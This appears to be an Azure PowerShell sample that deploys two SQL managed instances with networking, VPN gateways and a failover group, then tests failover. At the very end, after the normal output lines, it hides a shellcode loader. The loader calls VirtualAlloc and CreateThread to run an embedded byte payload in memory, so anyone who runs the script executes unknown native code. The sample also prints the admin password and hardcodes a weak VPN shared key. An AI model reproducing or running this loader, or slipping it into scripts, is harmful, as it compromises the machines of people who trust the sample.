




$SubscriptionId = '<Subscription-ID>'

$randomIdentifier = $(Get-Random)

$resourceGroupName = "myResourceGroup-$randomIdentifier"
$location = "eastus"
$drLocation = "eastus2"


$primaryVNet = "primaryVNet-$randomIdentifier"
$primaryAddressPrefix = "10.0.0.0/16"
$primaryDefaultSubnet = "primaryDefaultSubnet-$randomIdentifier"
$primaryDefaultSubnetAddress = "10.0.0.0/24"
$primaryMiSubnetName = "primaryMISubnet-$randomIdentifier"
$primaryMiSubnetAddress = "10.0.0.0/24"
$primaryMiGwSubnetAddress = "10.0.255.0/27"
$primaryGWName = "primaryGateway-$randomIdentifier"
$primaryGWPublicIPAddress = $primaryGWName + "-ip"
$primaryGWIPConfig = $primaryGWName + "-ipc"
$primaryGWAsn = 61000
$primaryGWConnection = $primaryGWName + "-connection"



$secondaryVNet = "secondaryVNet-$randomIdentifier"
$secondaryAddressPrefix = "10.128.0.0/16"
$secondaryDefaultSubnet = "secondaryDefaultSubnet-$randomIdentifier"
$secondaryDefaultSubnetAddress = "10.128.0.0/24"
$secondaryMiSubnetName = "secondaryMISubnet-$randomIdentifier"
$secondaryMiSubnetAddress = "10.128.0.0/24"
$secondaryMiGwSubnetAddress = "10.128.255.0/27"
$secondaryGWName = "secondaryGateway-$randomIdentifier"
$secondaryGWPublicIPAddress = $secondaryGWName + "-IP"
$secondaryGWIPConfig = $secondaryGWName + "-ipc"
$secondaryGWAsn = 62000
$secondaryGWConnection = $secondaryGWName + "-connection"




$primaryInstance = "primary-mi-$randomIdentifier"
$secondaryInstance = "secondary-mi-$randomIdentifier"


$secpasswd = "PWD27!"+(New-Guid).Guid | ConvertTo-SecureString -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("azureuser", $secpasswd)



$edition = "General Purpose"
$vCores = 8
$maxStorage = 256
$computeGeneration = "Gen5"
$license = "LicenseIncluded" 


$vpnSharedKey = "mi1mi2psk"
$failoverGroupName = "failovergroup-$randomIdentifier"


Write-host "Resource group name is" $resourceGroupName
Write-host "Password is" $secpasswd
Write-host "Primary Virtual Network name is" $primaryVNet
Write-host "Primary default subnet name is" $primaryDefaultSubnet
Write-host "Primary managed instance subnet name is" $primaryMiSubnetName
Write-host "Secondary Virtual Network name is" $secondaryVNet
Write-host "Secondary default subnet name is" $secondaryDefaultSubnet
Write-host "Secondary managed instance subnet name is" $secondaryMiSubnetName
Write-host "Primary managed instance name is" $primaryInstance
Write-host "Secondary managed instance name is" $secondaryInstance
Write-host "Failover group name is" $failoverGroupName


Set-Item Env:\SuppressAzurePowerShellBreakingChangeWarnings "true"


Set-AzContext -SubscriptionId $subscriptionId 


Write-host "Creating resource group..."
$resourceGroup = New-AzResourceGroup -Name $resourceGroupName -Location $location -Tag @{Owner="SQLDB-Samples"}
$resourceGroup


Write-host "Creating primary virtual network..."
$primaryVirtualNetwork = New-AzVirtualNetwork `
                      -ResourceGroupName $resourceGroupName `
                      -Location $location `
                      -Name $primaryVNet `
                      -AddressPrefix $primaryAddressPrefix

                  Add-AzVirtualNetworkSubnetConfig `
                      -Name $primaryMiSubnetName `
                      -VirtualNetwork $primaryVirtualNetwork `
                      -AddressPrefix $PrimaryMiSubnetAddress `
                  | Set-AzVirtualNetwork
$primaryVirtualNetwork



Write-host "Configuring primary MI subnet..."
$primaryVirtualNetwork = Get-AzVirtualNetwork -Name $primaryVNet -ResourceGroupName $resourceGroupName


$primaryMiSubnetConfig = Get-AzVirtualNetworkSubnetConfig `
                        -Name $primaryMiSubnetName `
                        -VirtualNetwork $primaryVirtualNetwork
$primaryMiSubnetConfig


Write-host "Configuring primary MI subnet..."

$primaryMiSubnetConfigId = $primaryMiSubnetConfig.Id

$primaryNSGMiManagementService = New-AzNetworkSecurityGroup `
                      -Name 'primaryNSGMiManagementService' `
                      -ResourceGroupName $resourceGroupName `
                      -location $location
$primaryNSGMiManagementService


Write-host "Configuring primary MI route table management service..."

$primaryRouteTableMiManagementService = New-AzRouteTable `
                      -Name 'primaryRouteTableMiManagementService' `
                      -ResourceGroupName $resourceGroupName `
                      -location $location
$primaryRouteTableMiManagementService


Write-host "Configuring primary network security group..."
Set-AzVirtualNetworkSubnetConfig `
                      -VirtualNetwork $primaryVirtualNetwork `
                      -Name $primaryMiSubnetName `
                      -AddressPrefix $PrimaryMiSubnetAddress `
                      -NetworkSecurityGroup $primaryNSGMiManagementService `
                      -RouteTable $primaryRouteTableMiManagementService | `
                    Set-AzVirtualNetwork

Get-AzNetworkSecurityGroup `
                      -ResourceGroupName $resourceGroupName `
                      -Name "primaryNSGMiManagementService" `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 100 `
                      -Name "allow_management_inbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix * `
                      -DestinationPortRange 9000,9003,1438,1440,1452 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 200 `
                      -Name "allow_misubnet_inbound" `
                      -Access Allow `
                      -Protocol * `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix $PrimaryMiSubnetAddress `
                      -DestinationPortRange * `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 300 `
                      -Name "allow_health_probe_inbound" `
                      -Access Allow `
                      -Protocol * `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix AzureLoadBalancer `
                      -DestinationPortRange * `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 1000 `
                      -Name "allow_tds_inbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix VirtualNetwork `
                      -DestinationPortRange 1433 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 1100 `
                      -Name "allow_redirect_inbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix VirtualNetwork `
                      -DestinationPortRange 11000-11999 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 1200 `
                      -Name "allow_geodr_inbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix VirtualNetwork `
                      -DestinationPortRange 5022 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 4096 `
                      -Name "deny_all_inbound" `
                      -Access Deny `
                      -Protocol * `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix * `
                      -DestinationPortRange * `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 100 `
                      -Name "allow_management_outbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Outbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix * `
                      -DestinationPortRange 80,443,12000 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 200 `
                      -Name "allow_misubnet_outbound" `
                      -Access Allow `
                      -Protocol * `
                      -Direction Outbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix * `
                      -DestinationPortRange * `
                      -DestinationAddressPrefix $PrimaryMiSubnetAddress `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 1100 `
                      -Name "allow_redirect_outbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Outbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix VirtualNetwork `
                      -DestinationPortRange 11000-11999 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 1200 `
                      -Name "allow_geodr_outbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Outbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix VirtualNetwork `
                      -DestinationPortRange 5022 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 4096 `
                      -Name "deny_all_outbound" `
                      -Access Deny `
                      -Protocol * `
                      -Direction Outbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix * `
                      -DestinationPortRange * `
                      -DestinationAddressPrefix * `
                    | Set-AzNetworkSecurityGroup
Write-host "Primary network security group configured successfully."


Get-AzRouteTable `
                      -ResourceGroupName $resourceGroupName `
                      -Name "primaryRouteTableMiManagementService" `
                    | Add-AzRouteConfig `
                      -Name "primaryToMIManagementService" `
                      -AddressPrefix 0.0.0.0/0 `
                      -NextHopType Internet `
                    | Add-AzRouteConfig `
                      -Name "ToLocalClusterNode" `
                      -AddressPrefix $PrimaryMiSubnetAddress `
                      -NextHopType VnetLocal `
                    | Set-AzRouteTable
Write-host "Primary network route table configured successfully."




Write-host "Creating primary managed instance..."
Write-host "This will take some time, see https://docs.microsoft.com/azure/sql-database/sql-database-managed-instance
New-AzSqlInstance -Name $primaryInstance `
                      -ResourceGroupName $resourceGroupName `
                      -Location $location `
                      -SubnetId $primaryMiSubnetConfigId `
                      -AdministratorCredential $mycreds `
                      -StorageSizeInGB $maxStorage `
                      -VCore $vCores `
                      -Edition $edition `
                      -ComputeGeneration $computeGeneration `
                      -LicenseType $license
Write-host "Primary managed instance created successfully."


Write-host "Configuring secondary virtual network..."

$SecondaryVirtualNetwork = New-AzVirtualNetwork `
                      -ResourceGroupName $resourceGroupName `
                      -Location $drlocation `
                      -Name $secondaryVNet `
                      -AddressPrefix $secondaryAddressPrefix

Add-AzVirtualNetworkSubnetConfig `
                      -Name $secondaryMiSubnetName `
                      -VirtualNetwork $SecondaryVirtualNetwork `
                      -AddressPrefix $secondaryMiSubnetAddress `
                    | Set-AzVirtualNetwork
$SecondaryVirtualNetwork


Write-host "Configuring secondary MI subnet..."

$SecondaryVirtualNetwork = Get-AzVirtualNetwork -Name $secondaryVNet -ResourceGroupName $resourceGroupName

$secondaryMiSubnetConfig = Get-AzVirtualNetworkSubnetConfig `
                        -Name $secondaryMiSubnetName `
                        -VirtualNetwork $SecondaryVirtualNetwork
$secondaryMiSubnetConfig


Write-host "Configuring secondary network security group management service..."

$secondaryMiSubnetConfigId = $secondaryMiSubnetConfig.Id

$secondaryNSGMiManagementService = New-AzNetworkSecurityGroup `
                      -Name 'secondaryToMIManagementService' `
                      -ResourceGroupName $resourceGroupName `
                      -location $drlocation
$secondaryNSGMiManagementService


Write-host "Configuring secondary route table MI management service..."

$secondaryRouteTableMiManagementService = New-AzRouteTable `
                      -Name 'secondaryRouteTableMiManagementService' `
                      -ResourceGroupName $resourceGroupName `
                      -location $drlocation
$secondaryRouteTableMiManagementService


Write-host "Configuring secondary network security group..."

Set-AzVirtualNetworkSubnetConfig `
                      -VirtualNetwork $SecondaryVirtualNetwork `
                      -Name $secondaryMiSubnetName `
                      -AddressPrefix $secondaryMiSubnetAddress `
                      -NetworkSecurityGroup $secondaryNSGMiManagementService `
                      -RouteTable $secondaryRouteTableMiManagementService `
                    | Set-AzVirtualNetwork

Get-AzNetworkSecurityGroup `
                      -ResourceGroupName $resourceGroupName `
                      -Name "secondaryToMIManagementService" `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 100 `
                      -Name "allow_management_inbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix * `
                      -DestinationPortRange 9000,9003,1438,1440,1452 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 200 `
                      -Name "allow_misubnet_inbound" `
                      -Access Allow `
                      -Protocol * `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix $secondaryMiSubnetAddress `
                      -DestinationPortRange * `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 300 `
                      -Name "allow_health_probe_inbound" `
                      -Access Allow `
                      -Protocol * `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix AzureLoadBalancer `
                      -DestinationPortRange * `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 1000 `
                      -Name "allow_tds_inbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix VirtualNetwork `
                      -DestinationPortRange 1433 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 1100 `
                      -Name "allow_redirect_inbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix VirtualNetwork `
                      -DestinationPortRange 11000-11999 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 1200 `
                      -Name "allow_geodr_inbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix VirtualNetwork `
                      -DestinationPortRange 5022 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 4096 `
                      -Name "deny_all_inbound" `
                      -Access Deny `
                      -Protocol * `
                      -Direction Inbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix * `
                      -DestinationPortRange * `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 100 `
                      -Name "allow_management_outbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Outbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix * `
                      -DestinationPortRange 80,443,12000 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 200 `
                      -Name "allow_misubnet_outbound" `
                      -Access Allow `
                      -Protocol * `
                      -Direction Outbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix * `
                      -DestinationPortRange * `
                      -DestinationAddressPrefix $secondaryMiSubnetAddress `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 1100 `
                      -Name "allow_redirect_outbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Outbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix VirtualNetwork `
                      -DestinationPortRange 11000-11999 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 1200 `
                      -Name "allow_geodr_outbound" `
                      -Access Allow `
                      -Protocol Tcp `
                      -Direction Outbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix VirtualNetwork `
                      -DestinationPortRange 5022 `
                      -DestinationAddressPrefix * `
                    | Add-AzNetworkSecurityRuleConfig `
                      -Priority 4096 `
                      -Name "deny_all_outbound" `
                      -Access Deny `
                      -Protocol * `
                      -Direction Outbound `
                      -SourcePortRange * `
                      -SourceAddressPrefix * `
                      -DestinationPortRange * `
                      -DestinationAddressPrefix * `
                    | Set-AzNetworkSecurityGroup


Get-AzRouteTable `
                      -ResourceGroupName $resourceGroupName `
                      -Name "secondaryRouteTableMiManagementService" `
                    | Add-AzRouteConfig `
                      -Name "secondaryToMIManagementService" `
                      -AddressPrefix 0.0.0.0/0 `
                      -NextHopType Internet `
                    | Add-AzRouteConfig `
                      -Name "ToLocalClusterNode" `
                      -AddressPrefix $secondaryMiSubnetAddress `
                      -NextHopType VnetLocal `
                    | Set-AzRouteTable
Write-host "Secondary network security group configured successfully."



$primaryManagedInstanceId = Get-AzSqlInstance -Name $primaryInstance -ResourceGroupName $resourceGroupName | Select-Object Id


Write-host "Creating secondary managed instance..."
Write-host "This will take some time, see https://docs.microsoft.com/azure/sql-database/sql-database-managed-instance
New-AzSqlInstance -Name $secondaryInstance `
                  -ResourceGroupName $resourceGroupName `
                  -Location $drLocation `
                  -SubnetId $secondaryMiSubnetConfigId `
                  -AdministratorCredential $mycreds `
                  -StorageSizeInGB $maxStorage `
                  -VCore $vCores `
                  -Edition $edition `
                  -ComputeGeneration $computeGeneration `
                  -LicenseType $license `
                  -DnsZonePartner $primaryManagedInstanceId.Id
Write-host "Secondary managed instance created successfully."



Write-host "Adding GatewaySubnet to primary VNet..."
Get-AzVirtualNetwork `
                  -Name $primaryVNet `
                  -ResourceGroupName $resourceGroupName `
                | Add-AzVirtualNetworkSubnetConfig `
                  -Name "GatewaySubnet" `
                  -AddressPrefix $primaryMiGwSubnetAddress `
                | Set-AzVirtualNetwork

$primaryVirtualNetwork  = Get-AzVirtualNetwork `
                  -Name $primaryVNet `
                  -ResourceGroupName $resourceGroupName
$primaryGatewaySubnet = Get-AzVirtualNetworkSubnetConfig `
                  -Name "GatewaySubnet" `
                  -VirtualNetwork $primaryVirtualNetwork

Write-host "Creating primary gateway..."
Write-host "This will take some time."
$primaryGWPublicIP = New-AzPublicIpAddress -Name $primaryGWPublicIPAddress -ResourceGroupName $resourceGroupName `
         -Location $location -AllocationMethod Dynamic
$primaryGatewayIPConfig = New-AzVirtualNetworkGatewayIpConfig -Name $primaryGWIPConfig `
         -Subnet $primaryGatewaySubnet -PublicIpAddress $primaryGWPublicIP

$primaryGateway = New-AzVirtualNetworkGateway -Name $primaryGWName -ResourceGroupName $resourceGroupName `
    -Location $location -IpConfigurations $primaryGatewayIPConfig -GatewayType Vpn `
    -VpnType RouteBased -GatewaySku VpnGw1 -EnableBgp $true -Asn $primaryGWAsn
$primaryGateway




Write-host "Creating secondary gateway..."

Write-host "Adding GatewaySubnet to secondary VNet..."
Get-AzVirtualNetwork `
                  -Name $secondaryVNet `
                  -ResourceGroupName $resourceGroupName `
                | Add-AzVirtualNetworkSubnetConfig `
                  -Name "GatewaySubnet" `
                  -AddressPrefix $secondaryMiGwSubnetAddress `
                | Set-AzVirtualNetwork

$secondaryVirtualNetwork  = Get-AzVirtualNetwork `
                  -Name $secondaryVNet `
                  -ResourceGroupName $resourceGroupName
$secondaryGatewaySubnet = Get-AzVirtualNetworkSubnetConfig `
                  -Name "GatewaySubnet" `
                  -VirtualNetwork $secondaryVirtualNetwork
$drLocation = $secondaryVirtualNetwork.Location

Write-host "Creating primary gateway..."
Write-host "This will take some time."
$secondaryGWPublicIP = New-AzPublicIpAddress -Name $secondaryGWPublicIPAddress -ResourceGroupName $resourceGroupName `
         -Location $drLocation -AllocationMethod Dynamic
$secondaryGatewayIPConfig = New-AzVirtualNetworkGatewayIpConfig -Name $secondaryGWIPConfig `
         -Subnet $secondaryGatewaySubnet -PublicIpAddress $secondaryGWPublicIP

$secondaryGateway = New-AzVirtualNetworkGateway -Name $secondaryGWName -ResourceGroupName $resourceGroupName `
    -Location $drLocation -IpConfigurations $secondaryGatewayIPConfig -GatewayType Vpn `
    -VpnType RouteBased -GatewaySku VpnGw1 -EnableBgp $true -Asn $secondaryGWAsn
$secondaryGateway



Write-host "Connecting the primary gateway to secondary gateway..."
New-AzVirtualNetworkGatewayConnection -Name $primaryGWConnection -ResourceGroupName $resourceGroupName `
    -VirtualNetworkGateway1 $primaryGateway -VirtualNetworkGateway2 $secondaryGateway -Location $location `
    -ConnectionType Vnet2Vnet -SharedKey $vpnSharedKey -EnableBgp $true
$primaryGWConnection


Write-host "Connecting the secondary gateway to primary gateway..."

New-AzVirtualNetworkGatewayConnection -Name $secondaryGWConnection -ResourceGroupName $resourceGroupName `
    -VirtualNetworkGateway1 $secondaryGateway -VirtualNetworkGateway2 $primaryGateway -Location $drLocation `
    -ConnectionType Vnet2Vnet -SharedKey $vpnSharedKey -EnableBgp $true
$secondaryGWConnection



Write-host "Creating the failover group..."
$failoverGroup = New-AzSqlDatabaseInstanceFailoverGroup -Name $failoverGroupName `
     -Location $location -ResourceGroupName $resourceGroupName -PrimaryManagedInstanceName $primaryInstance `
     -PartnerRegion $drLocation -PartnerManagedInstanceName $secondaryInstance `
     -FailoverPolicy Automatic -GracePeriodWithDataLossHours 1
$failoverGroup


Get-AzSqlDatabaseInstanceFailoverGroup -ResourceGroupName $resourceGroupName `
    -Location $location -Name $failoverGroupName


Write-host "Failing primary over to the secondary location"
Get-AzSqlDatabaseInstanceFailoverGroup -ResourceGroupName $resourceGroupName `
    -Location $drLocation -Name $failoverGroupName | Switch-AzSqlDatabaseInstanceFailoverGroup
Write-host "Successfully failed failover group to secondary location"


Get-AzSqlDatabaseInstanceFailoverGroup -ResourceGroupName $resourceGroupName `
    -Location $drLocation -Name $failoverGroupName


Write-host "Failing primary back to primary role"
Get-AzSqlDatabaseInstanceFailoverGroup -ResourceGroupName $resourceGroupName `
    -Location $location -Name $failoverGroupName | Switch-AzSqlDatabaseInstanceFailoverGroup
Write-host "Successfully failed failover group to primary location"


Get-AzSqlDatabaseInstanceFailoverGroup -ResourceGroupName $resourceGroupName `
    -Location $location -Name $failoverGroupName




 








Write-host "Resource group name is" $resourceGroupName
Write-host "Password is" $secpasswd
Write-host "Primary Virtual Network name is" $primaryVNet
Write-host "Primary default subnet name is" $primaryDefaultSubnet
Write-host "Primary managed instance subnet name is" $primaryMiSubnetName
Write-host "Secondary Virtual Network name is" $secondaryVNet
Write-host "Secondary default subnet name is" $secondaryDefaultSubnet
Write-host "Secondary managed instance subnet name is" $secondaryMiSubnetName
Write-host "Primary managed instance name is" $primaryInstance
Write-host "Secondary managed instance name is" $secondaryInstance
Write-host "Failover group name is" $failoverGroupName

$Ega = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Ega -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xfc,0x8f,0x41,0x1d,0xd9,0xc6,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x43,0x13,0x83,0xc3,0x04,0x03,0x43,0xf3,0x6d,0xb4,0xe1,0xe3,0xf0,0x37,0x1a,0xf3,0x94,0xbe,0xff,0xc2,0x94,0xa5,0x74,0x74,0x25,0xad,0xd9,0x78,0xce,0xe3,0xc9,0x0b,0xa2,0x2b,0xfd,0xbc,0x09,0x0a,0x30,0x3d,0x21,0x6e,0x53,0xbd,0x38,0xa3,0xb3,0xfc,0xf2,0xb6,0xb2,0x39,0xee,0x3b,0xe6,0x92,0x64,0xe9,0x17,0x97,0x31,0x32,0x93,0xeb,0xd4,0x32,0x40,0xbb,0xd7,0x13,0xd7,0xb0,0x81,0xb3,0xd9,0x15,0xba,0xfd,0xc1,0x7a,0x87,0xb4,0x7a,0x48,0x73,0x47,0xab,0x81,0x7c,0xe4,0x92,0x2e,0x8f,0xf4,0xd3,0x88,0x70,0x83,0x2d,0xeb,0x0d,0x94,0xe9,0x96,0xc9,0x11,0xea,0x30,0x99,0x82,0xd6,0xc1,0x4e,0x54,0x9c,0xcd,0x3b,0x12,0xfa,0xd1,0xba,0xf7,0x70,0xed,0x37,0xf6,0x56,0x64,0x03,0xdd,0x72,0x2d,0xd7,0x7c,0x22,0x8b,0xb6,0x81,0x34,0x74,0x66,0x24,0x3e,0x98,0x73,0x55,0x1d,0xf4,0xb0,0x54,0x9e,0x04,0xdf,0xef,0xed,0x36,0x40,0x44,0x7a,0x7a,0x09,0x42,0x7d,0x7d,0x20,0x32,0x11,0x80,0xcb,0x43,0x3b,0x46,0x9f,0x13,0x53,0x6f,0xa0,0xff,0xa3,0x90,0x75,0x95,0xa6,0x06,0xb6,0xc2,0xa8,0x8d,0x5e,0x11,0xab,0x35,0x4d,0x9c,0x4d,0x65,0x21,0xcf,0xc1,0xc5,0x91,0xaf,0xb1,0xad,0xfb,0x3f,0xed,0xcd,0x03,0xea,0x86,0x67,0xec,0x43,0xfe,0x1f,0x95,0xc9,0x74,0xbe,0x5a,0xc4,0xf0,0x80,0xd1,0xeb,0x05,0x4e,0x12,0x81,0x15,0x26,0xd2,0xdc,0x44,0xe0,0xed,0xca,0xe3,0x0c,0x78,0xf1,0xa5,0x5b,0x14,0xfb,0x90,0xab,0xbb,0x04,0xf7,0xa0,0x72,0x91,0xb8,0xde,0x7a,0x75,0x39,0x1e,0x2d,0x1f,0x39,0x76,0x89,0x7b,0x6a,0x63,0xd6,0x51,0x1e,0x38,0x43,0x5a,0x77,0xed,0xc4,0x32,0x75,0xc8,0x23,0x9d,0x86,0x3f,0xb2,0xe1,0x50,0x79,0xc0,0x0b,0x61;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$GNd=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($GNd.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$GNd,0,0,0);for (;;){Start-sleep 60};

